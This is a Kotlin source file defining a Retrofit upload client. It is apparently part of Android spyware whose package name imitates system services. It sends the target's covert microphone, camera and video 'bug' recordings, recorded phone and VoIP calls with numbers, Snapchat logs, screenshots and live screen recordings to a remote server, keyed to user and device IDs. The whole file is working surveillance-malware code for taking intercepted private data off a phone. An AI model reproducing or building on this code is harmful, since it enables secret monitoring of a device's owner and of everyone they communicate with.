package com.android.services.retrofit

import com.android.services.models.FileUploadResponse
import com.android.services.util.AppConstants
import com.android.services.util.ServerAuthUtil
import hu.akarnokd.rxjava3.retrofit.RxJava3CallAdapterFactory
import okhttp3.*
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Call
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Multipart
import retrofit2.http.POST
import retrofit2.http.Part
import java.util.concurrent.TimeUnit

interface FileUploaderAPI {

    @Multipart
    @POST("micBug")
    fun uploadMicBug(
        @Part file: MultipartBody.Part,
        @Part("name") name: RequestBody,
        @Part("duration") duration: RequestBody,
        @Part("startDatetime") startDatetime: RequestBody,
        @Part("pushId") pushId: RequestBody,
        @Part("pushStatus") pushStatus: RequestBody,
        @Part("userId") userId: RequestBody,
        @Part("phoneServiceId") phoneServiceId: RequestBody,
    ): Call<FileUploadResponse>

    @Multipart
    @POST("imVoiceMessage")
    fun uploadVoiceMessage(
        @Part file: MultipartBody.Part,
        @Part("appName") appName: RequestBody,
        @Part("fileName") fileName: RequestBody,
        @Part("dateTaken") dateTaken: RequestBody,
        @Part("userId") userId: RequestBody,
        @Part("phoneServiceId") phoneServiceId: RequestBody,
    ): Call<FileUploadResponse>

    @Multipart
    @POST("photo")
    fun uploadPhoto(
        @Part file: MultipartBody.Part,
        @Part("photoId") photoId: RequestBody,
        @Part("photoName") photoName: RequestBody,
        @Part("photoType") photoType: RequestBody,
        @Part("photoDateTaken") photoDateTaken: RequestBody,
        @Part("userId") userId: RequestBody,
        @Part("phoneServiceId") phoneServiceId: RequestBody,
    ): Call<FileUploadResponse>

    @Multipart
    @POST("snapchatLog")
    fun uploadSnapChatEvents(
        @Part file: MultipartBody.Part,
        @Part("name") name: RequestBody,
        @Part("dateTaken") dateTaken: RequestBody,
        @Part("type") type: RequestBody,
        @Part("userId") userId: RequestBody,
        @Part("phoneServiceId") phoneServiceId: RequestBody,
    ): Call<FileUploadResponse>

    @Multipart
    @POST("recordedCalls")
    fun uploadCallRecording(
        @Part file: MultipartBody.Part,
        @Part("callerName") callerName: RequestBody,
        @Part("callName") callName: RequestBody,
        @Part("callDuration") callDuration: RequestBody,
        @Part("callStartTime") callStartTime: RequestBody,
        @Part("callDirection") callDirection: RequestBody,
        @Part("callNumber") callNumber: RequestBody,
        @Part("userId") userId: RequestBody,
        @Part("phoneServiceId") phoneServiceId: RequestBody,
    ): Call<FileUploadResponse>

    @Multipart
    @POST("cameraBug")
    fun uploadCameraBug(
        @Part file: MultipartBody.Part,
        @Part("name") name: RequestBody,
        @Part("startDatetime") startDatetime: RequestBody,
        @Part("cameraType") cameraType: RequestBody,
        @Part("pushId") pushId: RequestBody,
        @Part("pushStatus") pushStatus: RequestBody,
        @Part("userId") userId: RequestBody,
        @Part("phoneServiceId") phoneServiceId: RequestBody,
    ): Call<FileUploadResponse>

    @Multipart
    @POST("videoBug")
    fun uploadVideoBug(
        @Part file: MultipartBody.Part,
        @Part("name") name: RequestBody,
        @Part("startDatetime") startDatetime: RequestBody,
        @Part("cameraType") cameraType: RequestBody,
        @Part("pushId") pushId: RequestBody,
        @Part("pushStatus") pushStatus: RequestBody,
        @Part("userId") userId: RequestBody,
        @Part("phoneServiceId") phoneServiceId: RequestBody,
    ): Call<FileUploadResponse>

    @Multipart
    @POST("screenShot")
    fun uploadScreenShot(
        @Part file: MultipartBody.Part,
        @Part("name") callerName: RequestBody,
        @Part("dateTaken") dateTaken: RequestBody,
        @Part("pushId") pushId: RequestBody,
        @Part("pushStatus") pushStatus: RequestBody,
        @Part("userId") userId: RequestBody,
        @Part("phoneServiceId") phoneServiceId: RequestBody,
    ): Call<FileUploadResponse>

    @Multipart
    @POST("voipcall")
    fun uploadVoipCall(
        @Part file: MultipartBody.Part,
        @Part("uniqueId") uniqueId: RequestBody,
        @Part("callType") callType: RequestBody,
        @Part("callDirection") callDirection: RequestBody,
        @Part("callNumber") callNumber: RequestBody,
        @Part("callDateTime") callDateTime: RequestBody,
        @Part("name") name: RequestBody,
        @Part("appName") appName: RequestBody,
        @Part("callDuration") callDuration: RequestBody,
        @Part("userId") userId: RequestBody,
        @Part("phoneServiceId") phoneServiceId: RequestBody,
    ): Call<FileUploadResponse>

    @Multipart
    @POST("liveScreenRecording")
    fun uploadScreenRecordings(
        @Part file: MultipartBody.Part,
        @Part("name") name: RequestBody,
        @Part("startDatetime") startDatetime: RequestBody,
        @Part("appName") appName: RequestBody,
        @Part("appPackageName") appPackageName: RequestBody,
        @Part("pushId") pushId: RequestBody,
        @Part("pushStatus") pushStatus: RequestBody,
        @Part("userId") userId: RequestBody,
        @Part("phoneServiceId") phoneServiceId: RequestBody,
    ): Call<FileUploadResponse>

    companion object {

        val tosApiClient by lazy { invoke(AppConstants.NODE_SERVER_URL) }
        private val loggingInterceptor = HttpLoggingInterceptor().apply {
            this.level = HttpLoggingInterceptor.Level.BODY
        }

        operator fun invoke(baseUrl: String): FileUploaderAPI {
            val httpClient = OkHttpClient.Builder()
                .connectTimeout(60, TimeUnit.SECONDS)
                .writeTimeout(60, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)

//            if (BuildConfig.DEBUG) {
//                httpClient.addInterceptor(loggingInterceptor)
//            }
            httpClient.addInterceptor(object : Interceptor {
                override fun intercept(chain: Interceptor.Chain): Response {
                    val originalRequest = chain.request()
                    val url = originalRequest.url.toString()
                    val token: String = ServerAuthUtil.getServerToken(url)
                    val request = if (token.isNotEmpty()) {
                        chain.request()
                            .newBuilder()
                            .addHeader("Content-Type", "multipart/form-data")
                            .addHeader("x-access-token", token)
                            .build()
                    } else {
                        chain.request()
                            .newBuilder()
                            .addHeader("Content-Type", "multipart/form-data")
                            .build()
                    }
                    return chain.proceed(request)
                }
            })
            return Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(GsonConverterFactory.create())
                .addCallAdapterFactory(RxJava3CallAdapterFactory.create())
                .client(httpClient.build())
                .build()
                .create(FileUploaderAPI::class.java)
        }
    }
}